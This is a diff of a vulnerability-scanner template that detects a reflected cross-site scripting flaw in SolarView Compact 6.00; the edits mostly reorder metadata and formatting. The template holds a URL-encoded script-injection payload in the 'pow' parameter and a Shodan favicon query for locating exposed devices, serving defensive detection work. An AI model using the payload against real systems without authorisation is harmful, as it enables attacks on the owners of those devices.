@@ -1,4 +1,5 @@
 id: solarview-compact-pow-xss
+
 info:
   name: SolarView Compact 6.00 - 'pow' Cross-Site Scripting
   author: For3stCo1d
@@ -15,14 +16,16 @@ info:
     - https://github.com/ARPSyndicate/cvemon
     - https://github.com/ARPSyndicate/kenzer-templates
   metadata:
+    verified: true
     max-request: 1
     shodan-query: http.favicon.hash:-244067125
-    verified: true
-  tags: edb,solarview,vuln,xss
+  tags: xss,solarview,edb,vuln
+
 http:
   - method: GET
     path:
       - '{{BaseURL}}/Solar_SlideSub.php?id=4&play=1&pow=sds%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&bgcolor=green'
+
     matchers-condition: and
     matchers:
       - type: word
@@ -31,11 +34,13 @@ http:
           - '<script>alert(document.domain)</script><"">'
           - 'SolarView'
         condition: and
+
       - type: word
         part: header
         words:
           - "text/html"
+
       - type: status
         status:
           - 200
-        # digest: 4a0a00473045022100c3d826c3dd8105da6805ed8ca89ea6f1660ad7c0e3684a5dbeeb00281677f1de02202c141d402e9e987f37c09e134ffa2464317b55d007806dc9272c740244cac9d3:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a00473045022100c3d826c3dd8105da6805ed8ca89ea6f1660ad7c0e3684a5dbeeb00281677f1de02202c141d402e9e987f37c09e134ffa2464317b55d007806dc9272c740244cac9d3:922c64590222798bb761d5b6d8e72950
